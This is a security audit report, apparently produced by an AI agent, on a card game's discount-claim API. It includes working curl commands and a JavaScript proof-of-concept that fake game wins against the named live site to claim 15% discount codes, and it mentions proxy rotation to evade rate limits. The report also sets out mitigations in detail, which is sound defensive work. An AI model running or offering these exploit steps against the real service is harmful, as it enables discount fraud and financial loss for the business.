# Security Report - Crazy Aces Discount Claim API

**Date**: 2025-12-09
**Analyst**: Security & Anti-Cheat Agent
**Risk Level**: **CRITICAL**

---

## Executive Summary

The claim-discount API **CAN be exploited without playing the game**. An attacker can obtain the maximum 15% discount in under 5 seconds with a simple script. The core vulnerability is that win streaks are incremented via API calls with no validation that actual gameplay occurred.

---

## Risk Summary

An attacker can bypass all client-side game logic by directly calling the `/api/start-game` endpoint to create a session and then repeatedly calling it with `won: true` to artificially inflate their win streak. With a 2+ win streak, they can claim the maximum 15% discount code. This can be automated to harvest discount codes at scale (limited only by rate limiting of 3 per IP per hour, easily bypassed with proxy rotation).

---

## Vulnerabilities Found

### [CRITICAL] Win Streak Manipulation via Direct API Calls

**Location**: `api/start-game.js:106-176`
**CVSS**: 9.1 (Critical)

**Attack Vector**:
```bash
# Step 1: Create session
SESSION=$(curl -s -X POST https://play.playingarts.com/api/start-game \
  -H "Content-Type: application/json" \
  -d '{}' | jq -r '.sessionToken')

# Step 2: Fake win #1
SESSION=$(curl -s -X POST https://play.playingarts.com/api/start-game \
  -H "Content-Type: application/json" \
  -d "{\"sessionToken\":\"$SESSION\",\"won\":true}" | jq -r '.sessionToken')

# Step 3: Fake win #2 (now at 15% tier)
SESSION=$(curl -s -X POST https://play.playingarts.com/api/start-game \
  -H "Content-Type: application/json" \
  -d "{\"sessionToken\":\"$SESSION\",\"won\":true}" | jq -r '.sessionToken')

# Step 4: Claim discount
curl -X POST https://play.playingarts.com/api/claim-discount \
  -H "Content-Type: application/json" \
  -d "{\"sessionToken\":\"$SESSION\",\"email\":\"attacker@example.com\"}"
```

**Impact**:
- Unlimited 15% discount codes (rate limited to 3/hour/IP, bypassed with proxies)
- Financial loss from fraudulent discounts
- Devaluation of legitimate player rewards

**Root Cause**: The `start-game.js` endpoint accepts a `won` boolean with no validation that:
1. A game was actually started
2. Any moves were made
3. The game lasted a minimum duration
4. The game state progression was valid

---

### [HIGH] Rate Limiting Bypass via IP Rotation

**Location**: `api/lib/rateLimit.js:70-77`, `api/claim-discount.js:82-98`

**Attack Vector**:
- Use VPN, proxy rotation, or Tor to bypass IP-based rate limits
- Residential proxy services offer millions of IPs
- Rate limit: 3 claims per IP per hour = 3 discount codes per proxy per hour

**Impact**: Mass harvesting of discount codes

**Root Cause**: Rate limiting is solely IP-based with no secondary validation

---

### [MEDIUM] Rate Limit Fail-Open Design

**Location**: `api/lib/rateLimit.js:56-64`

**Code**:
```javascript
} catch (error) {
    console.error('[ERROR] Rate limit check failed:', ...);
    // On error, allow request (fail open for availability)
    return { allowed: true, remaining: limit - 1, resetAt: Date.now() + windowSeconds * 1000 };
}
```

**Impact**: If Redis is temporarily unavailable or throws errors, rate limiting is completely bypassed.

**Recommendation**: Consider fail-closed for security-critical operations, or implement a circuit breaker.

---

### [MEDIUM] Client-Side State Not Used for Claim Validation

**Location**: `src/js/services/GameState.js` (entire file)

**Analysis**: While the client-side `GameState` class tracks detailed game information (moves, hands, deck state), **none of this data is sent to or validated by the server**. This is actually correct design (client data should never be trusted), but it means the server has zero proof-of-gameplay.

---

### [LOW] Session Token Contains Win Streak (Information Leak)

**Location**: `api/lib/session.js:33-41`

**Analysis**: The session token payload contains the win streak:
```javascript
const payload = JSON.stringify({ sessionId, winStreak, timestamp: Date.now() });
```

While the token is HMAC-signed and cannot be forged, an attacker can decode the base64 payload to see their current win streak.

---

### [LOW] Development Mode Fallbacks

**Location**: `api/claim-discount.js:137-140`, `api/start-game.js:169-176`

**Analysis**: When Redis is not configured, the API falls back to trusting token data directly.

---

## What's Working Well

1. **HMAC-signed session tokens** - Cannot be forged without the secret
2. **Timing-safe comparison** (`crypto.timingSafeEqual`) - Prevents timing attacks
3. **Session secret validation** - Fails fast if secret is missing/weak in production
4. **Email normalization** - Prevents Gmail dot/plus tricks
5. **Disposable email blocking** - Comprehensive blocklist
6. **Email hashing in Redis** - Privacy protection using SHA-256
7. **Session invalidation after claim** - Prevents token reuse (`redis.del`)
8. **Security headers** - Proper CSP, X-Frame-Options via `setSecurityHeaders()`
9. **CORS whitelist** - Only allows legitimate origins
10. **Cryptographically secure session IDs** - 32 random bytes

---

## Recommended Fixes

### Fix 1: Add Gameplay Proof-of-Work (CRITICAL)

Add minimum requirements before allowing win registration:

```javascript
// In start-game.js - when recording a win
if (won) {
    const sessionData = JSON.parse(sessionDataStr);

    // Require game to have been "started" (add gameStartedAt field)
    if (!sessionData.gameStartedAt) {
        return res.status(400).json({ error: 'No game in progress' });
    }

    // Require minimum game duration (30 seconds)
    const gameDuration = Date.now() - new Date(sessionData.gameStartedAt).getTime();
    if (gameDuration < 30000) {
        return res.status(400).json({ error: 'Game completed too quickly' });
    }

    // Require minimum moves (track via separate endpoint)
    if ((sessionData.moveCount || 0) < 10) {
        return res.status(400).json({ error: 'Insufficient game actions' });
    }

    // Clear game state after recording win (prevent replay)
    sessionData.gameStartedAt = null;
    sessionData.moveCount = 0;
    sessionData.winStreak += 1;
}
```

### Fix 2: Add Game Event Tracking Endpoint

```javascript
// New endpoint: POST /api/game-event
export default async function handler(req, res) {
    const { sessionToken, event } = req.body;

    const tokenData = verifySessionToken(sessionToken);
    if (!tokenData) return res.status(401).json({ error: 'Invalid session' });

    const sessionData = JSON.parse(await redis.get(`session:${tokenData.sessionId}`));

    if (event === 'game_start') {
        sessionData.gameStartedAt = Date.now();
        sessionData.moveCount = 0;
    } else if (event === 'move') {
        sessionData.moveCount = (sessionData.moveCount || 0) + 1;
        sessionData.lastMoveAt = Date.now();
    }

    await redis.setex(`session:${tokenData.sessionId}`, SESSION_TIMEOUT, JSON.stringify(sessionData));
    return res.status(200).json({ success: true });
}
```

### Fix 3: Add Global Daily Claim Limit

```javascript
// In claim-discount.js
const today = new Date().toISOString().split('T')[0];
const dailyClaimCount = await redis.get(`daily_claims:${today}`);
if (parseInt(dailyClaimCount || 0) > 100) {
    return res.status(429).json({ error: 'Daily limit reached' });
}

// After successful claim:
await redis.incr(`daily_claims:${today}`);
await redis.expire(`daily_claims:${today}`, 86400);
```

### Fix 4: Add Email-Based Attempt Rate Limiting

```javascript
// In claim-discount.js, after email validation
const emailAttemptKey = `ratelimit:attempt:${emailHash}`;
const emailRateLimit = await checkRateLimit(redis, emailAttemptKey, 3, 86400); // 3 per day

if (!emailRateLimit.allowed) {
    return res.status(429).json({ error: 'Too many attempts for this email' });
}
```

### Fix 5: Add Maximum Wins Per Hour Limit

```javascript
// In start-game.js, when recording wins
const hourlyWinKey = `wins:${tokenData.sessionId}:${Math.floor(Date.now() / 3600000)}`;
const hourlyWins = await redis.incr(hourlyWinKey);
await redis.expire(hourlyWinKey, 3600);

if (hourlyWins > 10) { // Max 10 wins per hour (very generous)
    return res.status(429).json({ error: 'Too many wins recorded' });
}
```

---

## Proof of Concept

```javascript
// exploit.js - Demonstrates the vulnerability
// WARNING: For authorized testing only

async function exploitDiscountClaim(email) {
    const baseUrl = 'https://play.playingarts.com/api';

    // Create session
    let response = await fetch(`${baseUrl}/start-game`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '{}'
    });
    let data = await response.json();
    let token = data.sessionToken;
    console.log('Session created, win streak:', data.winStreak);

    // Fake 2 wins (no gameplay required!)
    for (let i = 0; i < 2; i++) {
        response = await fetch(`${baseUrl}/start-game`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionToken: token, won: true })
        });
        data = await response.json();
        token = data.sessionToken;
        console.log('Win recorded, streak:', data.winStreak);
    }

    // Claim 15% discount
    response = await fetch(`${baseUrl}/claim-discount`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionToken: token, email })
    });
    data = await response.json();
    console.log('Claim result:', data);

    return data;
}
```

---

## Priority Action Items

| Priority | Issue | Fix | Effort |
|----------|-------|-----|--------|
| **P0** | Win streak manipulation | Add gameplay validation (Fix 1 + 2) | 2-4 hours |
| **P1** | IP rate limit bypass | Add email-based rate limiting (Fix 4) | 30 min |
| **P1** | Mass harvesting | Add global daily limit (Fix 3) | 30 min |
| **P2** | Win rate anomaly | Add hourly win cap (Fix 5) | 30 min |

---

## Conclusion

**The discount system is NOT secure.** The current architecture trusts API callers to honestly report game outcomes. While the cryptographic foundations are solid (HMAC, timing-safe comparisons, secure random IDs), the business logic layer lacks proof-of-work validation.

**Minimum viable fix**: Before accepting a win, require:
1. `gameStartedAt` timestamp must exist
2. Game duration >= 30 seconds
3. Move count >= 10
4. Hourly win cap

This raises the bar from "instant API exploit" to "must at least simulate gameplay timing."

---

*Report generated by Security & Anti-Cheat Agent*
*Based on code review of: api/claim-discount.js, api/start-game.js, api/lib/session.js, api/lib/rateLimit.js, api/lib/emailValidation.js*
